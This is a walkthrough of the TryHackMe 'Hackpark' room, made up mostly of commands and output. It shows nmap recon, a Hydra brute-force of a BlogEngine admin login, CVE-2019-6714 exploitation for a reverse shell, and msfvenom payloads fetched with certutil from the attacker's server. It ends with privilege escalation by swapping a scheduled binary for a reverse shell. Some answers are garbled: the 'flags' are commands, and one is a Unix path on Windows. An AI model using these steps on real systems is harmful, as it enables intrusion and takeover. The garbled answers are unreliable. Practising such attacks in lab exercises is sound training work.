## Room Information

Platform: <a href="https://www.tryhackme.com" target="_blank">TryHackMe</a>

Room Name: <a href="https://tryhackme.com/room/hackpark" target="blank">Hackpark</a>

Difficulty: [Medium]

Date Completed: [04/03/2026]

## Objective

- Active Recon
- Web App Attacks
- Privilege Escalation

## Summary

Gather information about the target machine using a network scanner tool. Than use hydra to bruteforce the login page on the website being hosted. Upload and execute our payload on the website and get a reverse shell, which leads to compromising the webserver. We then pivot to a more stable reverse shell and escalate our privileges to Root/Administrator.

## Tools Used
 - Rustscan/Nmap
 - Burpsuite
 - Hydra
 - Metasploit
 - Msfvenom
 - Netcat

## Reconnaissance

### Summary

We use the Nmap tool to know which ports are open and which service they are running and their versions.

**Scan for open ports:**

```
❯ sudo nmap 10.112.179.163 -n -sV -sC -Pn -p80,3389 -oN hackpark.nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 17:53 +0200
Nmap scan report for 10.112.179.163
Host is up (0.41s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
|_http-title: hackpark | hackpark amusements
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2026-03-07T15:49:33
|_Not valid after:  2026-09-06T15:49:33
|_ssl-date: 2026-03-08T15:53:48+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2026-03-08T15:53:42+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
# Nmap done at Sun Mar  8 17:53:49 2026 -- 1 IP address (1 host up) scanned in 17.32 seconds

```
- Looking at the information theres seems to be a webpage that is being hosted on port 80 of the system. Visiting the webpage we see, title of the page is **Hackpark** and a picture of a clown. Using reverse image search by putting the picture of this clown in Google Lens, we find that this clown is the character from the film **IT** named PennyWise. Also, analysizing the page source of the website, we find that it was developed using the BlogEngine framework. **BlogEngine.NET is an open-source, lightweight, and customizable blogging platform built on the Microsoft ASP.NET framework, designed for developers and users seeking a WordPress alternative.** There is also a login page ``` http://10.112.179.163/Account/login.aspx?ReturnURL=/admin/ ```.

**Question: Whats the name of the clown displayed on the homepage?**
**Answer: Pennywise**

## Brute-Force Attack Login page

### Summary

We identified a login page to attack and the type of request the form by using Burpsuite to capture the request the we make to the webserver. Once we have the **request type** and have a **URL** for the login form, we brute-force an admin account.

**Captured request using BurpSuite when we log-in on the login page:**

![image](https://images.makearmy.io/i/3a20f0f7-396f-4fe0-8d6c-404b6523cbc3.jpg)

- From the information I get from capturing the login request, I now know how to prompt hydra for brute-forcing. And when I analyse that once the login succeeds, an admin page is returned, the most probable username would be **admin**, so we only need to bruteforce the password.

**Brute-Force using hydra:**
 
```
❯ hydra -l admin \
-P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
10.112.179.163 \
http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=f8kYIy1tuZFxKbE2HxMvm5KeXO1xa9Ax8D6S9RhGhLBwTLRRd7I6q89SSssPcc84TCMdyAZRdAYEJ7bSiWdbGorREFi3t9HyLPyKpZKAXd4mTYqcxUXom%2F9KObUBFnKYmRsEkztzBRiFHnBw4%2BS7RaJ6Z2Ojstkt12UGQFObBVxSwv9y&__EVENTVALIDATION=%2FW2kt6n37Gsd18Roy%2FmrteFC%2FAZzbgzTxWgjFvmwyno0AZY9fLEu0YVkAS4u7K0KMXrcpV%2F6cmjRVTbZSUKz5kWeGN45KY4I7LFpzENrxwt7WeI%2FRp3yWNbTNtqHI0iNuS4jFAqnt0M7tCX7JTJoFEMaeAQjS41YQRXuPSrznGSXI1z2&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-08 18:58:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://10.112.179.163:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=f8kYIy1tuZFxKbE2HxMvm5KeXO1xa9Ax8D6S9RhGhLBwTLRRd7I6q89SSssPcc84TCMdyAZRdAYEJ7bSiWdbGorREFi3t9HyLPyKpZKAXd4mTYqcxUXom%2F9KObUBFnKYmRsEkztzBRiFHnBw4%2BS7RaJ6Z2Ojstkt12UGQFObBVxSwv9y&__EVENTVALIDATION=%2FW2kt6n37Gsd18Roy%2FmrteFC%2FAZzbgzTxWgjFvmwyno0AZY9fLEu0YVkAS4u7K0KMXrcpV%2F6cmjRVTbZSUKz5kWeGN45KY4I7LFpzENrxwt7WeI%2FRp3yWNbTNtqHI0iNuS4jFAqnt0M7tCX7JTJoFEMaeAQjS41YQRXuPSrznGSXI1z2&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 450.00 tries/min, 450 tries in 00:01h, 9550 to do in 00:22h, 16 active
[80][http-post-form] host: 10.112.179.163   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-08 19:00:05

```

**Question: What request type is the Windows website login form using?** 
**Answer: POST**

**Question: Guess a username, choose a password wordlist and gain credentials to a user account!**
**Answer: 1qaz2wsx**

## Compromise the machine

### Summary

Once logged into the website using the credentials we gained from bruteforcing, I am able to inspect the BlogEngine framework's version.  I than use exploit database archive to find an exploit to gain a reverse shell on the system using Netcat as our listener.

<p align="center">
<img src="https://imgur.com/q4ChSCM.png">
</p>

```
❯ searchsploit blogengine 3.3.6
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code E | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal    | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Trav | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py
----------------------------------------------------------- ---------------------------------

❯ searchsploit -x 46353
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
    Codes: CVE-2019-6714
 Verified: True
File Type: HTML document, ASCII text

```
- The exploit says that path traversal vulnerability that leads to remote code execution. This is caused by an unchecked "theme" parameter. First, we set the TcpClient address and port within the exploit to my attack host, which has a reverse tcp listener waiting for a connection(Netcat). Next, we upload this file through the file manager. The admin page that allows upload is ``` http://10.112.179.163/admin/app/editor/editpost.cshtml ```. Finally, the vulnerability is triggered by accessing the base URL for the blog with a theme override specified like so: ``` http://10.10.10.10/?theme=../../App_Data/files ```. Once this is done I'll get reverse shell on my tcp listener(Netcat).

```

❯ nc -lvnp 4445
listening on [any] 4445 ...
connect to [my ip address] from (UNKNOWN) [10.112.179.163] 49825
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog

```

**Question: Now you have logged into the website, are you able to identify the version of the BlogEngine?**
**Answer: 3.3.6.0**

**Question: What is the CVE?**
**Answer: CVE-2019-6714**

**Question: Who is the webserver running as?**
**Answer: iis apppool\blog**

## Windows Privilege Escalation Using Metasploit

### Summary 

We will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. Then we will use the gathered information to exploit the system and become the Administrator.

Create meterpreter reverse shell payload using msfvenom:

```
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my ip address> LPORT=4444 -e x86/shikata_ga_nai -f exe > reverse_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 7168 bytes

```
I start a simple python server, and on the shell that I got, fetch the payload.

My attack machine:
```
❯ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.112.179.163 - - [08/Mar/2026 21:43:32] "GET /reverse_shell.exe HTTP/1.1" 200 -
10.112.179.163 - - [08/Mar/2026 21:43:33] "GET /reverse_shell.exe HTTP/1.1" 200 -

```

Compromised machine:

```
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
cd C:/Windows/temp
c:\windows\system32\inetsrv>cd C:\Windows\temp
pwd
C:\Windows\Temp>pwd
certutil -urlcache -f http://<my vpn ip address>/reverse_shell.exe reverse_shell.exe
C:\Windows\Temp>certutil -urlcache -f http://<my vpn ip address>:8000/reverse_shell.exe reverse_shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
whoami
C:\Windows\Temp>whoami
iis apppool\blog
dir
C:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Windows\Temp
03/08/2026  12:43 PM    <DIR>          .
03/08/2026  12:43 PM    <DIR>          ..
...
03/08/2026  12:43 PM             7,168 reverse_shell.exe
...
              13 File(s)        642,150 bytes
               3 Dir(s)  38,979,338,240 bytes free

```

I start reverse TCP handler using metasploit on my machine:
```
❯ msfconsole -q
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost <my vpn ip address>
lhost => <my vpn ip address>
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on <my vpn ip address>:4444 
[*] Sending stage (190534 bytes) to 10.112.179.163
[*] Meterpreter session 2 opened (<my vpn ip address>:4444 -> 10.112.179.163:50094) at 2026-03-08 22:01:13 +0200

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >

```
- Now I have meterpreter session

Execute reverse shell payload on compromised machine:
```
whoami
C:\Windows\Temp>whoami
iis apppool\blog
.\reverse_shell.exe
C:\Windows\Temp>.\reverse_shell.exe

```

From meterpreter session to powershell:
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```
Found a log file in ``` C:\Program Files (x86)\SystemScheduler\Events ```

```
PS > ls


    Directory: C:\Program Files (x86)\SystemScheduler\Events


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
...
-a---          3/8/2026   1:15 PM      53808 20198415519.INI_LOG.txt

...

- When I inspected the file I see that a binary is executed every 30 seconds by the service WindowsScheduler with Administrator permissions. This binary is located in ``` Directory: C:\Program Files (x86)\SystemScheduler ``` called **Message.exe**. So we create a payload with msfvenom with the same name of the binary on my machine. I rename the binary on the compromised machine as something else except **Message.exe** then upload the payload from my machine to the compromised machine using meterpreter, it will be than be executed causing reverse shell with Administrator privileges.

```

On my machine:

```
❯ msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=192.168.148.197 LPORT=5555 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 7168 bytes
Saved as: Message.exe


❯ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.148.197] from (UNKNOWN) [10.112.179.163] 50282
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>type C:\Users\jeff\Desktop\user.txt

C:\PROGRA~2\SYSTEM~1>type C:\Users\Administrator\Desktop\root.txt

```

On the metepreter session, we upload the malicious binary:
```
meterpreter > upload Message.exe "C:\Program Files (x86)\SystemScheduler"
[*] Uploading  : /home/kali/THM/hackpark/Message.exe -> C:\Program Files (x86)\SystemScheduler\Message.exe
[*] Completed  : /home/kali/THM/hackpark/Message.exe -> C:\Program Files (x86)\SystemScheduler\Message.exe

```








**Question: What is the OS version of this windows machine?**
**Answer: Windows 2012 R2 (6.3 Build 9600)**

**Question: Can you spot a service running some automated task that could be easily exploited? What is the name of this service?**
**Answer: WindowsScheduler**

**Question: What is the name of the binary you're supposed to exploit?**
**Answer: Message.exe**

**Question: What is the user flag (on Jeffs Desktop)?**
**Answer: type C:\Users\jeff\Desktop\user.txt**

**Question: What is the root flag?**
**Answer: type /root/root.txt**


## Privilege Escalation Without Metasploit

### Summary

We will escalate our privileges without the use of meterpreter/metasploit. We will pivot from our netcat session that we have established, to a more stable reverse shell. Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilites, before using this information to escalate to Administrator.






















**Question: Using winPeas, what was the Original Install time? (This is date and time)**
**Answer: 8/3/2019, 10:43:23 AM**